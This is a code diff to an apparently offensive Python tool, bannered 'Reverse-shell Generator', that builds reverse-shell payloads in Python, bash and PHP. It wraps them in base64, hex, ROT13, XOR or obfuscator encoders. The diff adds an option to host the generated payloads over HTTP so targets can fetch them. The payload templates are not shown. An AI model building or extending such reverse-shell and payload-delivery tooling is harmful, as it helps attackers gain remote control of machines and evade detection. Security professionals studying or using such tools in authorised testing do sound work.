@@ -11,7 +11,7 @@ from payloads import python, bash, php
 from encoders.encoder import (
     B64_WRAPPERS, HEX_WRAPPERS, ROT13_WRAPPERS, XOR_WRAPPERS, OBFUSCATOR_WRAPPERS
 )
-
+from host_payload import serve_directory
 from colorama import init, Fore, Style
 init(autoreset=True)
 
@@ -23,7 +23,6 @@ PAYLOAD_MAP = {
 
 def print_banner():
     print(Fore.RED + Style.BRIGHT + "\n╔" + "═"*64 + "╗")
-    # Block ASCII Art (centered by default)
     ascii_art = [
         "██████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗    ██╗██╗  ██╗",
         "██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██║    ██║╚██╗██╔╝",
@@ -38,7 +37,6 @@ def print_banner():
     print(Fore.WHITE + Style.BRIGHT + "║{:^64s}║".format("Reverse-shell Generator"))
     print(Fore.WHITE + "║{:^64s}║".format("Author: Praveen Magar"))
     print(Fore.RED + Style.BRIGHT + "╚" + "═"*64 + "╝" + Style.RESET_ALL)
-
 
 def save_payload(code: str, filename: str) -> None:
     os.makedirs("output", exist_ok=True)
@@ -143,6 +141,13 @@ def main():
     print(Fore.CYAN + f"LHOST     : {ip}")
     print(Fore.CYAN + f"LPORT     : {port}")
     print(Fore.CYAN + f"File      : {fname}")
+
+    # Offer to host the payload via HTTP (using imported function)
+    host = input(Fore.YELLOW + "\nDo you want to host the payload in the 'output' folder via HTTP? (y/n): " + Style.RESET_ALL).strip().lower()
+    if host == "y":
+        port_input = input(Fore.YELLOW + "Enter port to use for hosting (default 8080): " + Style.RESET_ALL).strip()
+        port = int(port_input) if port_input else 8080
+        serve_directory("output", port)
 
 if __name__ == "__main__":
     try:
